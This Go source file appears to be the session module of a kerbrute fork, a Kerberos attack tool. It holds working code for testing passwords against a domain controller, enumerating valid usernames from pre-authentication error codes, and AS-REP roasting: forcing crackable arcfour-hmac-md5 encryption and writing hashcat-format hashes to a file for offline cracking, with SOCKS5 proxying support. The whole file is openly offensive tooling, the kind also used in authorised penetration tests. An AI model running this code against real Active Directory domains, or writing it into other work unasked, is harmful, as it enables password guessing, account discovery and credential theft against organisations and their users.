package session

import (
	"context"
	"fmt"
	"github.com/mr-pmillz/kerbrute/util"
	"html/template"
	"os"
	"strings"

	"github.com/mr-pmillz/gokrb5/v8/iana/errorcode"

	kclient "github.com/mr-pmillz/gokrb5/v8/client"
	kconfig "github.com/mr-pmillz/gokrb5/v8/config"
	"github.com/mr-pmillz/gokrb5/v8/messages"
)

const krb5ConfigTemplateDNS = `[libdefaults]
dns_lookup_kdc = true
default_realm = {{.Realm}}
`

const krb5ConfigTemplateKDC = `[libdefaults]
default_realm = {{.Realm}}
[realms]
{{.Realm}} = {
	kdc = {{.DomainController}}
	admin_server = {{.DomainController}}
}
`

// KerbruteSession ...
type KerbruteSession struct {
	Domain       string
	Realm        string
	Kdcs         map[int]string
	ConfigString string
	Config       *kconfig.Config
	Verbose      bool
	SafeMode     bool
	HashFile     *os.File
	Logger       *util.Logger
}

// KerbruteSessionOptions ...
type KerbruteSessionOptions struct {
	Domain           string
	DomainController string
	Verbose          bool
	SafeMode         bool
	Downgrade        bool
	HashFilename     string
	Socks5Proxy      string // "host:port"
	Socks5Username   string
	Socks5Password   string
	logger           *util.Logger
}

func NewKerbruteSession(options KerbruteSessionOptions) (k KerbruteSession, err error) {
	if options.Domain == "" {
		return k, fmt.Errorf("domain must not be empty")
	}
	if options.logger == nil {
		logger := util.NewLogger(options.Verbose, "")
		options.logger = &logger
	}
	var hashFile *os.File
	if options.HashFilename != "" {
		hashFile, err = os.OpenFile(options.HashFilename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			return k, err
		}
		options.logger.Log.Infof("Saving any captured hashes to %s", hashFile.Name())
		if !options.Downgrade {
			options.logger.Log.Warningf("You are capturing AS-REPs, but not downgrading encryption. You probably want to downgrade to arcfour-hmac-md5 (--downgrade) to crack them with a user's password instead of AES keys")
		}
	}

	realm := strings.ToUpper(options.Domain)
	configstring := buildKrb5Template(realm, options.DomainController)
	Config, err := kconfig.NewFromString(configstring)
	if err != nil {
		panic(err)
	}

	// Configure SOCKS5 proxy if provided
	if options.Socks5Proxy != "" {
		Config.EnableSocks5(options.Socks5Proxy, options.Socks5Username, options.Socks5Password)
		options.logger.Log.Infof("Using SOCKS5 proxy: %s", options.Socks5Proxy)

		// If username/password authentication is used, log that too (without showing the actual password)
		if options.Socks5Username != "" {
			if options.Socks5Password != "" {
				options.logger.Log.Infof("Using SOCKS5 proxy authentication with username: %s", options.Socks5Username)
			} else {
				options.logger.Log.Infof("Using SOCKS5 proxy with username: %s but no password", options.Socks5Username)
			}
		}
	}

	// Create a context and apply it to the config
	ctx := context.Background()
	configWithContext := Config.WithContext(ctx)

	if options.Downgrade {
		configWithContext.LibDefaults.DefaultTktEnctypeIDs = []int32{23} // downgrade to arcfour-hmac-md5 for crackable AS-REPs
		options.logger.Log.Info("Using downgraded encryption: arcfour-hmac-md5")
	}

	// Use the config with context for all KDC operations
	_, kdcs, err := configWithContext.GetKDCs(realm, false)
	if err != nil {
		err = fmt.Errorf("Couldn't find any KDCs for realm %s. Please specify a Domain Controller", realm)
	}

	k = KerbruteSession{
		Domain:       options.Domain,
		Realm:        realm,
		Kdcs:         kdcs,
		ConfigString: configstring,
		Config:       configWithContext, // Use the config with context
		Verbose:      options.Verbose,
		SafeMode:     options.SafeMode,
		HashFile:     hashFile,
		Logger:       options.logger,
	}
	return k, err
}

func buildKrb5Template(realm, domainController string) string {
	data := map[string]interface{}{
		"Realm":            realm,
		"DomainController": domainController,
	}
	var kTemplate string
	if domainController == "" {
		kTemplate = krb5ConfigTemplateDNS
	} else {
		kTemplate = krb5ConfigTemplateKDC
	}
	t := template.Must(template.New("krb5ConfigString").Parse(kTemplate))
	builder := &strings.Builder{}
	if err := t.Execute(builder, data); err != nil {
		panic(err)
	}
	return builder.String()
}

func (k KerbruteSession) TestLogin(username, password string) (bool, error) {
	Client := kclient.NewWithPassword(username, k.Realm, password, k.Config, kclient.DisablePAFXFAST(true), kclient.AssumePreAuthentication(true))
	defer Client.Destroy()
	if ok, err := Client.IsConfigured(); !ok {
		return false, err
	}
	err := Client.Login()
	if err == nil {
		return true, err
	}
	success, err := k.TestLoginError(err)
	return success, err
}

func (k KerbruteSession) TestUsername(username string) (bool, error) {
	// client here does NOT assume preauthentication (as opposed to the one in TestLogin)

	cl := kclient.NewWithPassword(username, k.Realm, "foobar", k.Config, kclient.DisablePAFXFAST(true))

	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		fmt.Printf(err.Error())
	}
	b, err := req.Marshal()
	if err != nil {
		return false, err
	}
	rb, err := cl.SendToKDC(b, k.Realm)

	if err == nil {
		// If no error, we actually got an AS REP, meaning user does not have pre-auth required
		var ASRep messages.ASRep
		err = ASRep.Unmarshal(rb)
		if err != nil {
			// something went wrong, it's not a valid response
			return false, err
		}
		k.DumpASRepHash(ASRep)
		return true, nil
	}
	e, ok := err.(messages.KRBError)
	if !ok {
		return false, err
	}
	switch e.ErrorCode {
	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
		return true, nil
	default:
		return false, err

	}
}

func (k KerbruteSession) DumpASRepHash(asrep messages.ASRep) {
	hash, err := util.ASRepToHashcat(asrep)
	if err != nil {
		k.Logger.Log.Debugf("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", asrep.CName.PrincipalNameString(), err.Error())
		return
	}
	k.Logger.Log.Noticef("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", asrep.CName.PrincipalNameString(), hash)
	if k.HashFile != nil {
		_, err := k.HashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			k.Logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
	}
}
